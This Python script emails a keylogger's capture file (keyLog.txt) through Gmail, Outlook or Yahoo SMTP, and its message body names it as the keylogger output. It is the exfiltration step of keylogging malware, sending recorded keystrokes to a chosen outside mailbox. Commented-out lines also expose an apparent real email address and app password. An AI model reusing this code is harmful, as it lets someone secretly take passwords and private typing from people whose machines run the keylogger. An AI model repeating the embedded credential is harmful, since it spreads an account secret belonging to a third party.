import smtplib
from email import encoders
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
import getpass

# email_user = 'gor.pahuja@gmail.com'
email_user = input("What email address would you like to send this email from? ")
# email_password = 'quhdbmitpomeenpb'
# email_password = getpass.getpass("What's the password associated with this email address (or the App password)? ")
email_password = input("What's the password associated with this email address (or the App password)? ")
# email_send = 'gor.pahuja@gmail.com'
email_send = input("What email address would you like to send this email to? ")
subject = 'Python!'

msg = MIMEMultipart()
msg['From'] = email_user
msg['To'] = email_send
msg['Subject'] = subject

body = "Attaching the KeyLogger output file in this email. Sent from an automated Python program!"
msg.attach(MIMEText(body, 'plain'))

filename = 'keyLog.txt'
attachment = open(filename, 'rb')

part = MIMEBase('application', 'octet-stream')
part.set_payload(attachment.read())
encoders.encode_base64(part)
part.add_header('Content-Disposition', "attachment; filename= " + filename)

msg.attach(part)
text = msg.as_string()

if email_user[email_user.find('@'):] == '@gmail.com':
    server = smtplib.SMTP('smtp.gmail.com', 587)
elif email_user[email_user.find('@'):] == '@outlook.com':
    server = smtplib.SMTP('smtp-mail.outlook.com', 587)
elif email_user[email_user.find('@'):] == '@yahoo.com':
    server = smtplib.SMTP('smtp.mail.yahoo.com', 587)

server.starttls()
server.login(email_user, email_password)

server.sendmail(email_user, email_send, text)
server.quit()